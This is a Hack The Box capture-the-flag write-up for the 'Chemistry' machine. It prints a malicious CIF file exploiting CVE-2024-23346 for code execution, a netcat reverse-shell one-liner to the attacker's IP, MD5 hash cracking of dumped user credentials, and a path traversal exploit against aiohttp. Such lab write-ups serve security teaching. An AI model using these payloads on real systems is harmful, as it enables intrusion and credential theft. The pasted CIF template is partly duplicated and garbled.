![image](https://github.com/user-attachments/assets/81146324-46a2-4112-a69d-7cd2f5ea7918)

<br>

PLATFORM : <br>**Hack The Box**

BOX : <br>**Chemistry**

DIFFICULTY : <br>**Easy**

OS : <br>**Linux**

AUTHOR: <br>**Francesco Basile**

<br><br>

The inital nmap scans reveals two ports open, 22 and 5000.
 
    $ nmap -sVC --version-intensity 9 -p 22,5000 -Pn --disable-arp-ping -n chemistry -oN nmap/versions-scan.txt
    Starting Nmap 7.80 (https://nmap.org) at 2024-10-22 23:37 CEST
    Nmap scan report for chemistry (10.10.11.38)
    Host is up (0.51s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    5000/tcp open  upnp?
    | fingerprint-strings:
    |   GetRequest:
    |     HTTP/1.1 200 OK
    |     Server: Werkzeug/3.0.3 Python/3.9.5
    |     Date: Tue, 22 Oct 2024 21:37:54 GMT
    |     Content-Type: text/html; charset=utf-8
    |     Content-Length: 719
    |     Vary: Cookie
    |     Connection: close
    |
    |     class="title">Chemistry CIF Analyzer
    |
    |     Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.


<br><br>

# Pymatgen Insecure Deserializazion

<br>

The application hosted on the box at port 5000 looks like a parser for *Crystallographic Information Files (CIF)*.

![Pasted image 20241023002915-1](https://github.com/user-attachments/assets/b84120fa-fbe7-4534-844a-105686aa94f8)

<br><br>

Searching the web i find the recent *CVE-2024-23346* 

    https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0

A vulnerability in the parsing library *Pymatgen versions prior to 2024.2.8*, that executes arbitrary code via *insecure deserializazion*.
All you need to do is craft a malicious .cif file, and then inject the command you want to execute in it. We have a template of the file's structure in the link above:

    data_5yOhtAoR
    _audit_creation_date            2018-06-08
    _audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
    
    loop_
    _parent_propagation_vector.id
    _parent_propagation_vector.kxkykz
    k1 [0 0 0]
    
    _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d indata_5yOhtAoR
    _audit_creation_date            2018-06-08
    _audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
    
    loop_
    _parent_propagation_vector.id
    _parent_propagation_vector.kxkykz
    k1 [0 0 0]
    
    _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in
    ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" +
    "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("INSERT PAYLOAD");0,0,0'
    
    _space_group_magn.number_BNS  62.448
    _space_group_magn.name_BNS  "P  n'  m  a'  " 

<br><br>

Experimenting with an active handler and a series of bash payloads from https://www.revshells.com/, i find the right one to be:

    busybox nc 10.10.15.56 1337 -e sh

<br><br>

Which allows me to gain a reverse shell:

![Pasted image 20241023004209-1](https://github.com/user-attachments/assets/863f5c8e-9fd9-4335-832c-3b353981df40)


<br><br>

# Web App Enumeration

<br>

Checking the app's directory, i'm able to retrieve the .db database that has stored all the *users passwords md5 hashes*, encoded with the following algorythm, as i can read in the *app.py* file.

    hashed_password = hashlib.md5(password.encode()).hexdigest()

<br>

![Pasted image 20241023010333-1](https://github.com/user-attachments/assets/4d608551-6f3c-4efa-aa7f-12c6edfd4eac)

<br>

![Pasted image 20241023010740-1](https://github.com/user-attachments/assets/23efb1d7-f3bc-4c83-90d7-86ee6a9ee831)

<br><br>

A quick hop to https://crackstation.net reveals me the cleartext password of rosa's user:

![Pasted image 20241102202421](https://github.com/user-attachments/assets/f75f982e-c7e4-4475-aaef-a51aa3d913ff)

<br><br>

And finally i get an initial foothold on the machine. I have a set of credentials to access ssh:

    rosa:<PASSWORD>

<br><br>

# SSH Port Forwarding

<br>

Running linpeas.sh on the machine, i find out a *service listening on port 8080*, localhost

![Pasted image 20241023012150-2](https://github.com/user-attachments/assets/e23684f0-94c2-458f-bc70-886c0c5d34ca)

<br><br>

To enumerate this service, i make up an *SSH Port Forwarding* to our remote host, using the following command:

    ssh -L 8080:localhost:8080 rosa@10.10.11.38

<br><br>

This forwards *my local* 8080 port  to the remote machine's local 8080 port. 

<br>

*Attacking Box 127.0.0.1:8080 ----> Victim Box 127.0.0.1:8080*

<br>

It basically means that i can direct external traffic, like a scan or even access the service from a browser if possible, 
to an internal service on a remote machine that otherwise would be accessible only from the box itself.

<br><br>

# AioHttp Exploitation

<br>

Nmap shows me that Chemistry is running *aiohttp 3.9.1*:

![Pasted image 20241102200205](https://github.com/user-attachments/assets/cf5b4ec4-b9b7-4c90-b592-e9532b9966f0)

<br><br>

And this is the first result if i search it on google:

    https://github.com/z3rObyte/CVE-2024-23334-PoC

<br><br>

It looks like aiohttp software it is vulnerable to *path traversal* up to version *3.9.1*. I'm going to modify a bit the script to make it run on *my* localhost's port 8080 and redirecting the exploit to the internal service, trying to read *root's flag*. 

![Pasted image 20241102200634](https://github.com/user-attachments/assets/ade0fe67-0d57-48da-a028-0c308f1ffe52)

<br><br>

And...

![Pasted image 20241102201153](https://github.com/user-attachments/assets/40bfecd8-d215-4b34-abe2-ae06e139e189)

<br><br>

Success. I have partial root access that can be leveraged to a shell and eventual full compromise of the box.
